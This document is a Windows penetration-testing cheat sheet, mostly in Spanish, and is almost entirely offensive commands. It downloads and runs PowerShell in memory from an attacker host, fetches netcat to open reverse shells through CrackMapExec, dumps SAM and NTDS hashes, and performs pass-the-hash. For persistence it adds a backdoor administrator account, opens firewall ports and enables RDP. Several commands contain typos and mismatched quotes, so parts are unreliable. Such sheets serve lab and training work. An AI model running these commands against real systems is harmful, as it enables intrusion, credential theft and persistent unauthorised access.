# WinPTCS
Windows Pentest Cheat Sheet -  This is a basic level pentest assorted commads and snippts

___________
# Basic Windows Pentesting

## Buscando Vulnerabilidades
### searchsploit
Buscando en la DDBB de vulneravilidades con searchsploit. Probar siglas y combinaciones de nombre de servicios
```bash
searchsploit update
searchsploit <ServiceName>
searchsploit -x <XploitPath>       #Examina el exploit
searchsplot -m <XploitPath>        #Crea una copia del sploit en el directorio actual
```

## File and Data Transfering
Downloading a ps script to memory (Nishang for instance. Start /b to send the process to background
It's better to use a native process so we have to check it out.
```bash
start /b powershell IEX(New-Object Net.WebClient).downloadString('http://<myIP>:<myPort>/ps.ps1") # 
[Environment]::Is64BitOperatingSystem
[Environment]::Is64BitProcess
C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadString('http://<myIP>:<myPort>/ps.ps1")
```
### Downloading files from cmd
```bash
certutil.exe -f -urlcache -split http://<myIP>:<myPORT>/binary.exe nbinary.exe
powershell -c "(New-Object System.Net.WebCliente).donwnloadFile('http://<myIP>:<myPORT>/binary.exe', 'C:\Windows\Tasks\binary.exe')
powershell Invoke-WebRequest "http://<myIP>:<myPORT>/binary.exe" -OutFile "C:\Windows\Tasks\binary.exe"
iwr -uri http://10.10.14.8/nc.exe -OutFile nc.exe
```
### Downloading files with SAMBA
```bash
impacket-smbserver smbFolder $(pwd) -smb2support   #En mi maquina
```
Creamos un recurso compartido y copiamos
```posh
New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\<myIP>\smbFolder    #En PowerShell
dir SharedFolder:\
copy SharedFolder:\binary.exe C:\Windows\Tasks\binary.exe
copy localFile.txt \\<myIP>\smbFolder\localFile.txt
```
## Reconocimeinto y busqueda de exploits
Hacemos git clone a PowerSploit y dentro del modulo/carpeta Privesc
```bash
batgrep "function" PowerUp.ps1   #Ver funciones del script
echo "Invoke-AllChecks" >> PowerUp.ps1
```
Descargamos el script a la maquina para que se ejecute y esperamos la salida.
### Weseng
Clonamos weseng (Windows Exploit Suggester) para buscarle vulnerabilidades a la salida de SystemInfo
```bash
python wes.py systemInfoOutput.txt
python wes.py systemInfoOutput.txt -i "Elevation of privilege"
```
### Windows-Sploit-Suggester AonCyberLabs
Clonamos Windows-Exploit-Suggester de AonCyberLabs
```zsh
python windows-exploit-suggester.py --update   #Descarga un xlsx con registros
python windows-exploit-suggester.py --database <unafecha>.xlsx --systeminfo systemInfoOutput.txt
```
Tambien utilizar WinPEAS 
https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

## Persistencia y PostExplotacion
Teniendo privilegios de root, creamos un usuario y lo incluimos en el grupo de administradores
```zsh
net user maopiccoto maopiccoto123! /add
net localgroup Administrators maopiccoto /add
```
### NetTweaks && Firewall
Abriendo puertos y autorizando in/out dataTraffic en el Firewall
```posh
netsh advfirewall add rule name="Samba Port" portocol=TCP dir=in localport=445 action=allow
netsh advfirewall add rule name="Samba Port" portocol=TCP dir=in localport=445 action=allow
netstat -nat
```
### CrackMapExec
La idea es que al conectarnos regrese el mensaje Pwn3d!
```bash
cme smb <remoteIP> -u '<userName>' -p '<passwd>'
```
Lo ponemos a ejecutar comandos
```bash
cme smb <remoteIP> -u '<userName>' -p '<passwd>' -x 'whoami'
cme smb <remoteIP> -u '<userName>' -p '<passwd>' -x '\\<myIPsmbShared>\smbFolder\nc.exe -e cmd <myIP> <myPORT>'
cme smb <remoteIP> -u '<userName>' -p '<passwd>' --sam   #dumpea hashes
cme smb <remoteIP> -u '<userName>' -p '<passwd>' --ntds vss  #dupea mas hashes
```
#### PASS the HASH
Entonces podriamos hacer passTHEhash
```bash
cme smb <remoteIP> -u 'Administrator' -H 'xxxxxxx:ffffffff'
```
#### pth-winexe
Sirve para obtener una consola haciendo passTHEhash. WORKGROUP=Dominio
```bash
pth-winexe -U WORKGROUP/Administrator%<hashNTLM> //<remoteIP> cmd.exe
```
#### Obteniendo Hashes manualmente [pwdump]
Los hashes NTLM se guardan en 2 archivos: SAM & SYSTEM. Los copiamos, no podemos leerlos directamente porque siempre estan siendo utilizados por el sistema.
```bash
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup
```
En nuestra maquina utilizamos pwdump para revelar los hashes
```bash
pwdump SYSTEM SAM
```
### Impacket
Para saltar de un usuario privilegiado, en Administrators, a NT authority\system. Clonamos el repo y corremos install.py
```bash
psexec.py WORKGROUP/maopiccoto:maopiccoto123@<remoteIP> cmd.exe
```
Segun la respuesta del psexec tendremos que crear un recurso compartido
```posh
net share myFolder=C:\Widnows\Temp /GRANT:Administrators,FULL
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilerPolicy /t REG_DWORD /d 1 /f
```
### Habilitando el RDP
Primero creamos las reglas de firewall luego habilitamos el RDP en el registro
```posh
netsh advfirewall firewall add rule name="RDP Port" protocol=TCP dir=in localport=3389 action=allow
netsh advfirewall firewall add rule name="RDP Port" protocol=TCP dir=out localport=3389 action=allow

red add "HKEY_LOCAL_MAHCINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSconnections /t REG_DWORD /d 0 /f
```
Ya podriamos utilizar xfreerdp para conectarnos por remoto
```bash
xfreerdp /u:maopiccoto /d:WORKGROUP /p:maopiccoto123 /v:<remoteIP>
```
---
### Mapear recursos compartidos por SAMBA a nivel de red
```bash
smbmap -H <ipRemote> -u "null"
cmbclient -L <ipRemote> -N
```


